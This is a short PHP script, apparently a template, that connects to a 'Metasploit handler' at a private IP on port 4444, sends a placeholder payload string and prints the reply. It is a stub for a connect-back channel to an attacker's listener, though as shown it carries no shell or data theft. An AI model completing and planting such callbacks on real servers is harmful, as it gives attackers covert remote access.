<?php
$ip = '192.168.92.203';   // Replace with the IP address of your Metasploit handler
$port = 4444;             // Replace with the port of your Metasploit handler

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    die("Failed to create socket: " . socket_strerror(socket_last_error()) . "\n");
}

$result = socket_connect($socket, $ip, $port);
if ($result === false) {
    die("Failed to connect to Metasploit handler: " . socket_strerror(socket_last_error()) . "\n");
}

$payload = "Hello Metasploit!";  // Replace with your desired payload
socket_write($socket, $payload, strlen($payload));

$response = socket_read($socket, 1024);  // Read response from Metasploit handler
echo "Received response: " . $response . "\n";

socket_close($socket);
?>
